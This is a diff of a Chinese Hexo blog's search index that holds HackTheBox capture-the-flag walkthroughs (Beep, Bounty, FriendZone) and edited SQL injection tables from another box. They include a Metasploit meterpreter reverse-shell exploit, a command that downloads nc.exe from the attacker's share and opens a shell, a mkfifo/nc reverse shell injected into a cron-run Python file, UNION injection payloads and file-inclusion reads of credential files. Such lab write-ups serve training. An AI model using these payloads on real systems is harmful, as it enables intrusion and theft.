     <url>/2020/06/10/HTB-Bastard/</url>
     <content><![CDATA[<h1 id="Bastard"><a href="#Bastard" class="headerlink" title="Bastard"></a>Bastard</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Bastard/1.jpg" alt="1"></p>
@@ -942,6 +883,65 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB:Beep</title>
+    <url>/2020/06/11/HTB-Beep/</url>
+    <content><![CDATA[<h1 id="Beep"><a href="#Beep" class="headerlink" title="Beep"></a>Beep</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Beep/1.jpg" alt="1"></p>
+<p>扫出了很多端口</p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Beep/2.jpg" alt="2"></p>
+<p>web服务:elastix</p>
+<p><img src="/images/Beep/3.jpg" alt="3"></p>
+<p>之后对目录进行扫描</p>
+<p><img src="/images/Beep/4.jpg" alt="4"></p>
+<p>还发现了FreePBX</p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="方法1-文件包含"><a href="#方法1-文件包含" class="headerlink" title="方法1:文件包含"></a>方法1:文件包含</h3><p>searchsploit</p>
+<p> <img src="/images/Beep/6.jpg" alt="6"></p>
+<p>37637.pl</p>
+<p><img src="/images/Beep/5.jpg" alt="5"></p>
+<p><img src="/images/Beep/7.jpg" alt="7"></p>
+<p>发现文件包含成功了，现在读取的<code>/etc/amportal.conf</code> 是FreePBX的配置文件</p>
+<p><img src="/images/Beep/8.jpg" alt="8"></p>
+<p>我们还可以读取一下<code>/etc/asterisk/manager.conf</code>，这是FreePBX连接asterisk的管理密码</p>
+<p><img src="/images/Beep/9.jpg" alt="9"></p>
+<p>最后再读取一下/etc/passwd</p>
+<p><img src="/images/Beep/10.jpg" alt="10"></p>
+<p>获取拥有bash的用户，最后排列组合用户名和获取的密码尝试</p>
+<p>期间ssh还遇到了不支持sha1的问题，需要手动开启</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;ssh_config												&#x2F;&#x2F;不需要重启</span><br><span class="line">MACs hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160			&#x2F;&#x2F;删掉注释</span><br><span class="line">HostkeyAlgorithms ssh-dss,ssh-rsa									&#x2F;&#x2F;末尾添加</span><br><span class="line">KexAlgorithms +diffie-hellman-group1-sha1							&#x2F;&#x2F;末尾添加</span><br></pre></td></tr></table></figure>
+
+<p>最后使用账号/密码<code>root/jEhdIekWmdjE</code>，成功登录，还是root权限</p>
+<p><img src="/images/Beep/11.jpg" alt="11"></p>
+<h3 id="方法2-RCE"><a href="#方法2-RCE" class="headerlink" title="方法2:RCE"></a>方法2:RCE</h3><p><img src="/images/Beep/12.jpg" alt="12"></p>
+<p>Elastix存在RCE漏洞，不过直接运行18650.py会出现SSL证书错误</p>
+<p>可以利用burp强制tls转发</p>
+<p><img src="/images/Beep/13.jpg" alt="13"></p>
+<p>接着使用svwar扫描SIP线路</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install sipvicious</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Beep/15.jpg" alt="15"></p>
+<p>修改EXP</p>
+<p><img src="/images/Beep/14.jpg" alt="14"></p>
+<p>之后就可以获取shell</p>
+<p><img src="/images/Beep/16.jpg" alt="16"></p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img src="/images/Beep/17.jpg" alt="17"></p>
+<p>利用nmap提权</p>
+<p><img src="/images/Beep/18.jpg" alt="18"></p>
+<h3 id="方法3-msf"><a href="#方法3-msf" class="headerlink" title="方法3:msf"></a>方法3:msf</h3><p>使用字典<code>directory-list-2.3-medium.txt</code>发现目录<code>vtigercrm</code>版本5.1.0</p>
+<p><img src="/images/Beep/19.jpg" alt="19"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;http&#x2F;vtiger_soap_upload</span><br><span class="line">set RHOSTS 10.10.10.7</span><br><span class="line">set SSL true</span><br><span class="line">set RPORT 443</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST tun0</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
+
+<p>如果遇到SSL错误，是因为openssl版本太高不支持低版本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OpenSSL::SSL::SSLError SSL_connect returned&#x3D;1 errno&#x3D;0 state&#x3D;error: dh key too small</span><br></pre></td></tr></table></figure>
+
+<p>可以修改/etc/ssl/openssl.cnf，或者像之前一样，用burp转发解决</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[system_default_sect]</span><br><span class="line">MinProtocol = TLSv1<span class="number">.2</span></span><br><span class="line">CipherString = DEFAULT@SECLEVEL=<span class="number">2</span></span><br><span class="line"><span class="comment">//修改</span></span><br><span class="line">[system_default_sect]</span><br><span class="line">MinProtocol = None</span><br><span class="line">CipherString = DEFAULT</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB:Blocky</title>
     <url>/2020/10/22/HTB-Blocky/</url>
     <content><![CDATA[<h1 id="Blocky"><a href="#Blocky" class="headerlink" title="Blocky"></a>Blocky</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Blocky/1.png" alt="1"></p>
@@ -1029,6 +1029,43 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB:Bounty</title>
+    <url>/2020/06/22/HTB-Bounty/</url>
+    <content><![CDATA[<h1 id="Bounty"><a href="#Bounty" class="headerlink" title="Bounty"></a>Bounty</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Bounty/1.jpg" alt="1"></p>
+<p>只发现了80端口，且IIS版本为7.5</p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问http首页，没有有价值的信息<br>进行目录枚举，对IIS还要扫描asp和aspx页面</p>
+<p><img src="/images/Bounty/2.jpg" alt="2"></p>
+<p>发现了一处文件上传</p>
+<p><img src="/images/Bounty/3.jpg" alt="3"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>尝试上传文件</p>
+<p>先正常上传一张图片，看看能否访问</p>
+<p><img src="/images/Bounty/4.jpg" alt="4"></p>
+<p>提示上传成功</p>
+<p><img src="/images/Bounty/5.jpg" alt="5"></p>
+<p>并且在uploadedfiles目录下可以访问<br>确认上传文件可以被访问，就可以尝试上传恶意脚本</p>
+<p>尝试修改文件名和Content-Type观察上传机制</p>
+<p><img src="/images/Bounty/6.jpg" alt="6"></p>
+<p>发现.config是可以成功上传的，尝试searchsploit搜索相关漏洞，可惜一无所获<br>谷歌搜索关键词IIS 7.5 upload exloit config，找到了exp，<a href="https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/">链接</a><br>这个漏洞允许你上传文件名为<code>web.config</code>包含自定义asp代码，从而达到RCE</p>
+<p>修改一下payload，原来payload<code>whoami</code>无法运行<br>需要修改为<code>cmd /c whoami</code></p>
+<p><img src="/images/Bounty/8.jpg" alt="8"></p>
+<p><img src="/images/Bounty/7.jpg" alt="7"></p>
+<p>RCE成功，现在只要修改成获取shell的命令即可</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c cd %tmp% &amp;&amp; copy \\10.10.16.150\a\nc.exe &amp;&amp; nc.exe -nv 10.10.16.150 4444 -e cmd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Bounty/9.jpg" alt="9"></p>
+<p>成功获取shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="MS15-051"><a href="#MS15-051" class="headerlink" title="MS15-051"></a>MS15-051</h3><p><img src="/images/Bounty/10.jpg" alt="10"></p>
+<p><img src="/images/Bounty/11.jpg" alt="11"></p>
+<p>提权成功</p>
+]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Windows靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB:Blunder</title>
     <url>/2020/09/24/HTB-Blunder/</url>
     <content><![CDATA[<h1 id="Blunder"><a href="#Blunder" class="headerlink" title="Blunder"></a>Blunder</h1><p>kali:10.10.16.10<br>目标:10.10.10.191</p>
@@ -1086,43 +1123,6 @@
       </categories>
       <tags>
         <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB:Bounty</title>
-    <url>/2020/06/22/HTB-Bounty/</url>
-    <content><![CDATA[<h1 id="Bounty"><a href="#Bounty" class="headerlink" title="Bounty"></a>Bounty</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Bounty/1.jpg" alt="1"></p>
-<p>只发现了80端口，且IIS版本为7.5</p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问http首页，没有有价值的信息<br>进行目录枚举，对IIS还要扫描asp和aspx页面</p>
-<p><img src="/images/Bounty/2.jpg" alt="2"></p>
-<p>发现了一处文件上传</p>
-<p><img src="/images/Bounty/3.jpg" alt="3"></p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>尝试上传文件</p>
-<p>先正常上传一张图片，看看能否访问</p>
-<p><img src="/images/Bounty/4.jpg" alt="4"></p>
-<p>提示上传成功</p>
-<p><img src="/images/Bounty/5.jpg" alt="5"></p>
-<p>并且在uploadedfiles目录下可以访问<br>确认上传文件可以被访问，就可以尝试上传恶意脚本</p>
-<p>尝试修改文件名和Content-Type观察上传机制</p>
-<p><img src="/images/Bounty/6.jpg" alt="6"></p>
-<p>发现.config是可以成功上传的，尝试searchsploit搜索相关漏洞，可惜一无所获<br>谷歌搜索关键词IIS 7.5 upload exloit config，找到了exp，<a href="https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/">链接</a><br>这个漏洞允许你上传文件名为<code>web.config</code>包含自定义asp代码，从而达到RCE</p>
-<p>修改一下payload，原来payload<code>whoami</code>无法运行<br>需要修改为<code>cmd /c whoami</code></p>
-<p><img src="/images/Bounty/8.jpg" alt="8"></p>
-<p><img src="/images/Bounty/7.jpg" alt="7"></p>
-<p>RCE成功，现在只要修改成获取shell的命令即可</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c cd %tmp% &amp;&amp; copy \\10.10.16.150\a\nc.exe &amp;&amp; nc.exe -nv 10.10.16.150 4444 -e cmd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/Bounty/9.jpg" alt="9"></p>
-<p>成功获取shell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="MS15-051"><a href="#MS15-051" class="headerlink" title="MS15-051"></a>MS15-051</h3><p><img src="/images/Bounty/10.jpg" alt="10"></p>
-<p><img src="/images/Bounty/11.jpg" alt="11"></p>
-<p>提权成功</p>
-]]></content>
-      <categories>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>Windows靶机</tag>
       </tags>
   </entry>
   <entry>
@@ -1389,7 +1389,7 @@
 </tr>
 <tr>
 <td>email=evil@evil.com’ UNiON select 1,2,3,‘abc@abc.com’–+</td>
-<td>Email sent to: <a href="mailto:&#97;&#x62;&#x63;&#x40;&#x61;&#98;&#99;&#x2e;&#x63;&#111;&#x6d;">&#97;&#x62;&#x63;&#x40;&#x61;&#98;&#99;&#x2e;&#x63;&#111;&#x6d;</a>=&gt;2</td>
+<td>Email sent to: <a href="mailto:&#x61;&#98;&#x63;&#64;&#97;&#98;&#99;&#x2e;&#99;&#x6f;&#x6d;">&#x61;&#98;&#x63;&#64;&#97;&#98;&#99;&#x2e;&#99;&#x6f;&#x6d;</a>=&gt;2</td>
 </tr>
 </tbody></table>
 <p>现在要想办法构造查询的payload，而且要满足条件判断<br>这里可以通过<code>concat()</code></p>
@@ -1408,15 +1408,15 @@
 </tr>
 </thead>
 <tbody><tr>
-<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 0),”!”,”<a href="mailto:&#x61;&#x62;&#99;&#x40;&#97;&#x62;&#x63;&#46;&#x63;&#x6f;&#x6d;">&#x61;&#x62;&#99;&#x40;&#97;&#x62;&#x63;&#46;&#x63;&#x6f;&#x6d;</a>“)–+</td>
+<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 0),”!”,”<a href="mailto:&#x61;&#98;&#99;&#x40;&#97;&#x62;&#x63;&#x2e;&#x63;&#x6f;&#109;">&#x61;&#98;&#99;&#x40;&#97;&#x62;&#x63;&#x2e;&#x63;&#x6f;&#109;</a>“)–+</td>
 <td>groups</td>
 </tr>
 <tr>
-<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 1),”!”,”<a href="mailto:&#97;&#x62;&#99;&#64;&#97;&#x62;&#99;&#46;&#99;&#x6f;&#x6d;">&#97;&#x62;&#99;&#64;&#97;&#x62;&#99;&#46;&#99;&#x6f;&#x6d;</a>“)–+</td>
+<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 1),”!”,”<a href="mailto:&#97;&#98;&#99;&#x40;&#x61;&#98;&#x63;&#x2e;&#99;&#111;&#x6d;">&#97;&#98;&#99;&#x40;&#x61;&#98;&#x63;&#x2e;&#99;&#111;&#x6d;</a>“)–+</td>
 <td>license</td>
 </tr>
 <tr>
-<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 2),”!”,”<a href="mailto:&#97;&#x62;&#99;&#x40;&#x61;&#x62;&#x63;&#x2e;&#x63;&#111;&#109;">&#97;&#x62;&#99;&#x40;&#x61;&#x62;&#x63;&#x2e;&#x63;&#111;&#109;</a>“)–+</td>
+<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select table_name from information_schema.tables WHERE table_schema=’supercms’ limit 1 offset 2),”!”,”<a href="mailto:&#97;&#98;&#x63;&#64;&#x61;&#98;&#x63;&#46;&#99;&#x6f;&#x6d;">&#97;&#98;&#x63;&#64;&#x61;&#98;&#x63;&#46;&#99;&#x6f;&#x6d;</a>“)–+</td>
 <td>operators</td>
 </tr>
 </tbody></table>
@@ -1431,15 +1431,15 @@
 </tr>
 </thead>
 <tbody><tr>
-<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 0),”!”,”<a href="mailto:&#x61;&#98;&#99;&#x40;&#x61;&#x62;&#99;&#46;&#99;&#111;&#109;">&#x61;&#98;&#99;&#x40;&#x61;&#x62;&#99;&#46;&#99;&#111;&#109;</a>“)–+</td>
+<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 0),”!”,”<a href="mailto:&#x61;&#x62;&#99;&#64;&#97;&#98;&#x63;&#x2e;&#x63;&#111;&#109;">&#x61;&#x62;&#99;&#64;&#97;&#98;&#x63;&#x2e;&#x63;&#111;&#109;</a>“)–+</td>
 <td>id</td>
 </tr>
 <tr>
-<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 1),”!”,”<a href="mailto:&#97;&#x62;&#x63;&#64;&#x61;&#98;&#99;&#46;&#99;&#x6f;&#109;">&#97;&#x62;&#x63;&#64;&#x61;&#98;&#99;&#46;&#99;&#x6f;&#109;</a>“)–+</td>
+<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 1),”!”,”<a href="mailto:&#97;&#x62;&#x63;&#x40;&#x61;&#98;&#x63;&#46;&#99;&#x6f;&#109;">&#97;&#x62;&#x63;&#x40;&#x61;&#98;&#x63;&#46;&#99;&#x6f;&#109;</a>“)–+</td>
 <td>__username_</td>
 </tr>
 <tr>
-<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 2),”!”,”<a href="mailto:&#97;&#x62;&#99;&#64;&#97;&#98;&#99;&#x2e;&#99;&#x6f;&#109;">&#97;&#x62;&#99;&#64;&#97;&#98;&#99;&#x2e;&#99;&#x6f;&#109;</a>“)–+</td>
+<td>email=email=evil@evil.com’ UNiON select 1,2,3,concat(“!”,(select column_name from information_schema.columns  WHERE table_name=’operators’ limit 1 offset 2),”!”,”<a href="mailto:&#x61;&#98;&#99;&#64;&#x61;&#x62;&#x63;&#46;&#99;&#x6f;&#x6d;">&#x61;&#98;&#99;&#64;&#x61;&#x62;&#x63;&#46;&#99;&#x6f;&#x6d;</a>“)–+</td>
 <td>__password_</td>
 </tr>
 </tbody></table>
@@ -1971,6 +1971,83 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB:FriendZone</title>
+    <url>/2020/06/27/HTB-FriendZone/</url>
+    <content><![CDATA[<h1 id="FriendZone"><a href="#FriendZone" class="headerlink" title="FriendZone"></a>FriendZone</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/FriendZone/1.jpg" alt="1"></p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>尝试21端口匿名登录，失败</p>
+<p>进行smb枚举</p>
+<p>目录枚举</p>
+<p><img src="/images/FriendZone/2.jpg" alt="2"></p>
+<p>nmap枚举出了路径</p>
+<p><img src="/images/FriendZone/14.jpg" alt="14"></p>
+<p>目录权限枚举<br>(这里使用smbmap遇到Authentication error ，需要跟新impacket)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install --upgrade impacket</span><br><span class="line">smbmap -H 10.10.10.123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/FriendZone/3.jpg" alt="3"></p>
+<p>对目录树进行枚举</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbmap -H 10.10.10.123 -R --depth 5</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/FriendZone/4.jpg" alt="4"></p>
+<p>发现了creds.txt，看看那是什么</p>
+<p><img src="/images/FriendZone/5.jpg" alt="5"></p>
+<p>发现了账号密码</p>
+<p>访问web服务</p>
+<p><img src="/images/FriendZone/6.jpg" alt="6"></p>
+<p>发现了域名，想到之前的53端口DNS服务，我们应该配置host</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.123 		friendzoneportal.red friendzone.red</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/FriendZone/7.jpg" alt="7"></p>
+<p>进行区域传输</p>
+<p><img src="/images/FriendZone/8.jpg" alt="8"></p>
+<p>发现了更多子域，全部添加到hosts</p>
+<p><img src="/images/FriendZone/9.jpg" alt="9"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>登录带有admin关键字的网站</p>
+<p>登录错了</p>
+<p><img src="/images/FriendZone/10.jpg" alt="10"></p>
+<p>登录成功</p>
+<p><img src="/images/FriendZone/11.jpg" alt="11"></p>
+<p>跟着提示</p>
+<p><img src="/images/FriendZone/12.jpg" alt="12"></p>
+<p>看样子是文件包含，尝试利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对image 尝试 &#x2F;etc&#x2F;passwd 和00截断  都没有用</span><br><span class="line">对pagename 尝试 &#x2F;etc&#x2F;passwd 00截断 也没有用</span><br></pre></td></tr></table></figure>
+
+<p>之后尝试</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;dashboard.php</span><br></pre></td></tr></table></figure>
+
+<p>失败</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;dashboard</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/images/FriendZone/13.jpg" alt="13"></p>
+<p>看样子它的包含会添加.php后缀，而且无法截断</p>
+<p>我们已经满足了getshell的条件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb目录Development允许写入</span><br><span class="line">nmap扫出了上传的路径</span><br><span class="line">本地文件包含执行reverse_shell.php</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;administrator1.friendzone.red&#x2F;dashboard.php?image_id&#x3D;a.jpg&amp;pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;Development&#x2F;evil</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/FriendZone/16.jpg" alt="16"></p>
+<p>getshell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这个提权特别隐蔽…</p>
+<p>发现os.py具有W权限</p>
+<p><img src="/images/FriendZone/17.jpg" alt="17"></p>
+<p>发现cronjobs</p>
+<p><img src="/images/FriendZone/18.jpg" alt="18"></p>
+<p>调用了os库</p>
+<p><img src="/images/FriendZone/19.jpg" alt="19"></p>
+<p>直接给os加一行，因为还要调用os.system…</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;system(&#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.100 5555 &gt;&#x2F;tmp&#x2F;f&#39;)&quot; &gt;&gt; os.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/FriendZone/20.jpg" alt="20"></p>
+]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Linux靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB:Falafel</title>
     <url>/2020/06/28/HTB-Falafel/</url>
     <content><![CDATA[<h1 id="Falafel"><a href="#Falafel" class="headerlink" title="Falafel"></a>Falafel</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Falafel/1.jpg" alt="1"></p>
@@ -2144,83 +2221,6 @@
 <p>我们甚至能直接读root.txt<br>我们可以读取root的私钥(<code>/root/.ssh/id_rsa</code>)</p>
 <p><img src="/images/Falafel/31.jpg" alt="31"></p>
 <p>成功获取root</p>
-]]></content>
-      <categories>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>Linux靶机</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB:FriendZone</title>
-    <url>/2020/06/27/HTB-FriendZone/</url>
-    <content><![CDATA[<h1 id="FriendZone"><a href="#FriendZone" class="headerlink" title="FriendZone"></a>FriendZone</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/FriendZone/1.jpg" alt="1"></p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>尝试21端口匿名登录，失败</p>
-<p>进行smb枚举</p>
-<p>目录枚举</p>
-<p><img src="/images/FriendZone/2.jpg" alt="2"></p>
-<p>nmap枚举出了路径</p>
-<p><img src="/images/FriendZone/14.jpg" alt="14"></p>
-<p>目录权限枚举<br>(这里使用smbmap遇到Authentication error ，需要跟新impacket)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install --upgrade impacket</span><br><span class="line">smbmap -H 10.10.10.123</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/FriendZone/3.jpg" alt="3"></p>
-<p>对目录树进行枚举</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbmap -H 10.10.10.123 -R --depth 5</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/FriendZone/4.jpg" alt="4"></p>
-<p>发现了creds.txt，看看那是什么</p>
-<p><img src="/images/FriendZone/5.jpg" alt="5"></p>
-<p>发现了账号密码</p>
-<p>访问web服务</p>
-<p><img src="/images/FriendZone/6.jpg" alt="6"></p>
-<p>发现了域名，想到之前的53端口DNS服务，我们应该配置host</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.123 		friendzoneportal.red friendzone.red</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/FriendZone/7.jpg" alt="7"></p>
-<p>进行区域传输</p>
-<p><img src="/images/FriendZone/8.jpg" alt="8"></p>
-<p>发现了更多子域，全部添加到hosts</p>
-<p><img src="/images/FriendZone/9.jpg" alt="9"></p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>登录带有admin关键字的网站</p>
-<p>登录错了</p>
-<p><img src="/images/FriendZone/10.jpg" alt="10"></p>
-<p>登录成功</p>
-<p><img src="/images/FriendZone/11.jpg" alt="11"></p>
-<p>跟着提示</p>
-<p><img src="/images/FriendZone/12.jpg" alt="12"></p>
-<p>看样子是文件包含，尝试利用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对image 尝试 &#x2F;etc&#x2F;passwd 和00截断  都没有用</span><br><span class="line">对pagename 尝试 &#x2F;etc&#x2F;passwd 00截断 也没有用</span><br></pre></td></tr></table></figure>
-
-<p>之后尝试</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;dashboard.php</span><br></pre></td></tr></table></figure>
-
-<p>失败</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;dashboard</span><br></pre></td></tr></table></figure>
-
-<p>成功</p>
-<p><img src="/images/FriendZone/13.jpg" alt="13"></p>
-<p>看样子它的包含会添加.php后缀，而且无法截断</p>
-<p>我们已经满足了getshell的条件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb目录Development允许写入</span><br><span class="line">nmap扫出了上传的路径</span><br><span class="line">本地文件包含执行reverse_shell.php</span><br></pre></td></tr></table></figure>
-
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;administrator1.friendzone.red&#x2F;dashboard.php?image_id&#x3D;a.jpg&amp;pagename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;Development&#x2F;evil</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/FriendZone/16.jpg" alt="16"></p>
-<p>getshell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这个提权特别隐蔽…</p>
-<p>发现os.py具有W权限</p>
-<p><img src="/images/FriendZone/17.jpg" alt="17"></p>
-<p>发现cronjobs</p>
-<p><img src="/images/FriendZone/18.jpg" alt="18"></p>
-<p>调用了os库</p>
-<p><img src="/images/FriendZone/19.jpg" alt="19"></p>
-<p>直接给os加一行，因为还要调用os.system…</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;system(&#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.100 5555 &gt;&#x2F;tmp&#x2F;f&#39;)&quot; &gt;&gt; os.py</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/FriendZone/20.jpg" alt="20"></p>
 ]]></content>
       <categories>
         <category>HackTheBox</category>
@@ -3060,6 +3060,80 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB:Lazy</title>
+    <url>/2020/10/20/HTB-Lazy/</url>
